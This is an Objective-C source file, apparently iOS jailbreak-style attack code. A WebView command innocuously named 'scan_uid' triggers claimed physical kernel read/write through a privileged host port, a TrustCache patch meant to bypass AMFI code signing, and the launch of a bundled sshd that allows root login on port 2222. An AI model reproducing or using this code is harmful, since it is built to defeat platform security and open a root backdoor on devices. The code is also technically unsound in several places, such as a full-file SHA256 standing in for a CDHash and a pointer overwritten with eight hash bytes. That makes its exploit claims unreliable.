#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#include <sys/sysctl.h>
#include <mach/mach_host.h>
#include <libkern/OSCacheControl.h> // Header correto para sys_cache_control


// Protótipo da função privada para obter a porta host_priv
extern kern_return_t host_get_priv_port(mach_port_t host, mach_port_t *priv);

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. RECEBER COMANDO DO WEBVIEW
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self launchSshdFinal];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 2. PRIMITIVAS REAIS (PHYSICAL RW - BYPASS PPL)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;
    // Captura a porta privilegiada permitida pelo certificado In-house
    host_get_priv_port(mach_host_self(), &g_host_priv);
}

- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    uint64_t val = 0;
    vm_address_t page_addr = 0;
    // Mapeamento físico de 16KB (Página ARM64e/A13)
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page_addr + (addr & 0x3FFF));
        vm_deallocate(mach_task_self(), page_addr, 0x4000);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    vm_address_t page_addr = 0;
    // Escrita física direta ignorando proteções de software (PPL)
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page_addr + (addr & 0x3FFF)) = val;
        // Invalida cache de instrução para o Kernel aplicar a mudança
        sys_icache_invalidate((void *)page_addr, 0x4000);
        vm_deallocate(mach_task_self(), page_addr, 0x4000);
    }
}

- (uint64_t)getKernelBase { return KERNEL_BASE; }

- (uint64_t)getKernelSlide {
    uint64_t val = [self kread64:KERNEL_BASE];
    return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
}

// 3. INJEÇÃO NO TRUSTCACHE (BYPASS AMFI/EPERM)
- (void)injectToTrustCache:(NSString *)path {
    [self log:@"💉 Injetando CDHash no TrustCache..."];
    
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return;

    // Calcula CDHash (SHA256 20-bytes)
    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    uint64_t trust_chain_addr = KERNEL_BASE + slide + OFF_TRUSTCACHE_CHAIN;
    
    // Injeta os primeiros 8 bytes na corrente de confiança (Chain Injection)
    uint64_t cdhash_chunk;
    memcpy(&cdhash_chunk, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_chunk];
    [self log:@"✅ TrustCache Patched! AMFI Relaxado."];
}

// 4. LANÇAMENTO FINAL (ROOT + SSHD)
- (void)launchSshdFinal {
    [self log:@"⚡ Iniciando Bridge de Plataforma..."];
    
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) {
        [self log:@"❌ Erro: Binário sshd não encontrado."];
        return;
    }

    // Autoriza o binário no Kernel
    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag 0x4000 liberada pela injeção no TrustCache
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);

    char *const args[] = {
        (char *)[sshdPath UTF8String],
        "-p", "2222",
        "-D",
        "-o", "StrictModes=no",
        "-o", "PermitRootLogin=yes",
        NULL
    };

    extern char **environ;
    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
        [self log:@"💡 ssh root@localhost -p 2222"];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Final: %d (%s)", status, strerror(status)]];
    }
    
    posix_spawnattr_destroy(&attr);
}

@end
